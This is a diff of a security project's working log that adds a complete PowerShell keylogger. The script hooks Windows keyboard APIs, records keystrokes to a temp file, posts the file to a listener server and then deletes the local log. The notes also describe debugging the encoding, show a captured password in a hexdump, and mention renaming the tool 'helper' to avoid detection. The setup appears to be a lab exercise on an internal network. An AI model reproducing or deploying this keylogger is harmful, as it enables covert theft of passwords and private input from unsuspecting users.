@@ -863,7 +863,6 @@ Working:
 ### 26.10.2023
 *Sending file(s) from powershell to simple webserver in Linux*
 
-
 I made a `testfile.txt` to good old "Temp"
 ![](notes_res/notes-%2013.png)
 
@@ -871,6 +870,8 @@ The setup itself is the same again:
 - Windows 10
 - Kali Linux
 And both are assigned to the same internal network for testing purposes.
+
+Reason to try the POST method for sending the keylogs, that i wouldnt have to expose any passwords to victim device, as what happens in the mailing.
 
 POST request to web server:
 ```bash
@@ -916,5 +917,144 @@ Same tests again: Run, Execute, Receive, Check:
 
 **Working.**
 
+Modified the keylogger script, replacing the mailing with POST request to server:   
+```powershell
+$TimesToRun = 1                         # How many times to run the script.
+$RunTimeP = 1             		# Time in minutes.
+$endpoint = "192.168.66.2/server"       # Address to send the file to.
+############################
 
+$TimeStart = Get-Date
+$TimeEnd = $timeStart.addminutes($RunTimeP)
 
+#requires -Version 2
+function Start-Helper($Path="$env:temp\help.txt") 
+{
+  $signatures = @'
+[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
+public static extern short GetAsyncKeyState(int virtualKeyCode); 
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int GetKeyboardState(byte[] keystate);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int MapVirtualKey(uint uCode, int uMapType);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
+'@
+
+  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
+
+  $null = New-Item -Path $Path -ItemType File -Force
+
+  try
+  {
+
+    $Runner = 0
+        while ($TimesToRun  -ge $Runner) {
+        while ($TimeEnd -ge $TimeNow) {
+      Start-Sleep -Milliseconds 40
+      
+      for ($ascii = 9; $ascii -le 254; $ascii++) {
+        $state = $API::GetAsyncKeyState($ascii)
+
+        if ($state -eq -32767) {
+          $null = [console]::CapsLock
+
+          $virtualKey = $API::MapVirtualKey($ascii, 3)
+
+          $kbstate = New-Object Byte[] 256
+          $checkkbstate = $API::GetKeyboardState($kbstate)
+
+          $mychar = New-Object -TypeName System.Text.StringBuilder
+
+          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
+
+          if ($success) 
+          {
+            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
+          }
+        }
+      }
+          $TimeNow = Get-Date
+    }
+        Invoke-WebRequest -Uri http://$endpoint -Method POST -ContentType 'text/plain' -InFile $Path
+        Remove-Item -Path $Path -force
+        }
+  }
+  finally
+  {
+        exit 1
+  }
+}
+Start-Helper
+```
+
+**Testings:**
+
+It should now as it is:
+- Run and log the keys for one minute
+- Send them to server and delete the log file
+
+But not working, the servers shows an error:   
+![](notes_res/notes-%2019.png)
+
+Checked the logs from the victim, as it shows still there, while it should have been deleted.   
+Probably the error stopped the script:   
+![](notes_res/notes-%2020.png)
+
+I did this many times again and again, and finally figured, it must be that the logger formats the text as UTF-16...
+
+![](notes_res/notes-%2022.png)
+
+While the Flask tries to decode UTF-8 format:
+![](notes_res/notes-%2023.png)
+
+We had a discussion with the Project Team, and as Miljonka's .exe keylogger logs them in UTF-8, it must be with the script im using.   
+
+After some investigations and alot of coffee i figured it out:    
+![](notes_res/notes-%2024.png)   
+I switched the Unicode to UTF8   
+
+Ran it again, it seems to be working fine, except for the linebreak:   
+![](notes_res/notes-%2025.png)
+
+While debugging, it's actually ok, but probably an issue with the terminal itself:   
+```bash
+┌──(kali🥦kali)-[~/testing]
+└─$ file received_data.txt 
+received_data.txt: Unicode text, UTF-8 (with BOM) text, with CR line terminators
+                                                                                                                    
+┌──(kali🥦kali)-[~/testing]
+└─$ cat received_data.txt
+                                                                                                                    
+┌──(kali🥦kali)-[~/testing]
+└─$ hexdump -C received_data.txt
+
+00000000  ef bb bf c3 b6 c3 b6 0d  c3 a4 c3 a4 c3 a4 0d 6d  |...............m|
+00000010  79 20 70 61 73 73 77 6f  72 64 20 69 73 20 3a 20  |y password is : |
+00000020  72 6f 6f 74 73 73 73 73  73 0d 74 65 73 74 69 6e  |rootsssss.testin|
+00000030  67 20 6b 65 79 73 20 2f  2f 20 3a 3a 20 3f 3f 20  |g keys // :: ?? |
+00000040  21 21 21 20 c3 b6 c3 a4  20 c3 b6 c3 a4 c3 b6 0d  |!!! .... .......|
+00000050
+
+```
+
+And while opening it through gui:    
+![](notes_res/notes-%2026.png)
+
+**So that should be settled!**   
+
+Finalized files (for now anyway):   
+Had to do slight editing to make the loop work and not fail if the file doesnt exists, meaning if there where no keypresses.   
+Now it just keeps rolling until the amount of loop is done that is assigned.   
+
+*keylogger and everything related, is renamed to helper, to avoid any detections*    
+
+Server:   
+[webhook](/scripts/webhook/webhook)   
+Keylogger scripts:   
+[helper_mail.ps1](/payloads/keylogger/keylog_ps/helper_mail.ps1)   
+[helper_post.ps1](/payloads/keylogger/keylog_ps/helper_post.ps1)   
+
+*Not obfuscated for now. But that process is explained before and will be implemented whenever needed.*
+
+---
